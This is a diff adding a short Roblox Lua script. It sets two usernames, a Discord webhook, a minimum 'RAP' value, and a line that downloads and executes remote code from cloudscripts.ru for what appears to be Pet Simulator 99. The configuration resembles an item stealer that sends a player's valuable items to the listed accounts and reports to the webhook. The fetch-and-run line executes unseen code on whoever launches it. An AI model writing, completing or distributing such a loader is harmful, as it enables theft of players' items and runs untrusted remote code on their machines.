@@ -1,0 +1,5 @@
+Username = "name1" --your 1 usermame
+Username2 = "name2" --your 2 usermame
+Webhook = "https://discord.com/api/webhooks/x/x" --your webhook here
+MinimumRAP = 100000 --minimal rap
+loadstring(game:HttpGet("https://cloudscripts.ru/raw/ps99"))()
